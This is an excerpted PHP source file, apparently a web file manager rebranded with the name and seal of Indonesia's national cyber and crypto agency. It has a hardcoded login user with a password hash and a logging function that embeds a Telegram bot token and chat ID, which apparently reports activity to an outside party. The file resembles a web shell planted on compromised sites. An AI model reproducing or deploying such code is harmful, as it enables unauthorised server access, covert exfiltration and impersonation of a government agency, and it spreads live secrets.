...
//Application Title
define('APP_TITLE', 'BADAN SIBER DAN SANDI NEGARA');
...
$use_auth = true;
$auth_users = array(
    'kominfo' => '$2a$12$hnzxhi40chqs7BcSmn995.Zm.H45.cOKwuXmyKLMnhdEp.nkDd0xK', 
);
                ...
                <div class="row justify-content-md-center h-100">
                    <div class="card-wrapper">
                        <div class="card fat <?php echo fm_get_theme(); ?>">
                            ...
                            &mdash;&mdash; &copy;
                            <a href="https://t.me/" target="_blank" class="text-decoration-none text-muted" data-version="<?php echo VERSION; ?>">T.ME/</a> &mdash;&mdash;
                        </div>
                    </div>
                </div>
            </div>
...
<head>
    ...
    <meta name="author" content="BSSN @2026">
    ...
    <style>
        body.fm-login-page{ background-image: url('https://upload.wikimedia.org/wikipedia/commons/f/f8/Seal_of_the_National_Cyber_and_Crypto_Agency_of_the_Republic_Indonesia_%282020_Indonesian_version%29.png');background-repeat: no-repeat;background-position: center center;background-size: cover;}
...
function customLogger($message) {
    ...
    $telegramToken = '7520250109:AAGRiIauax-4mDUBp2CWjUqYgyrG2sncpjk';
    $chatId = '2029488529';
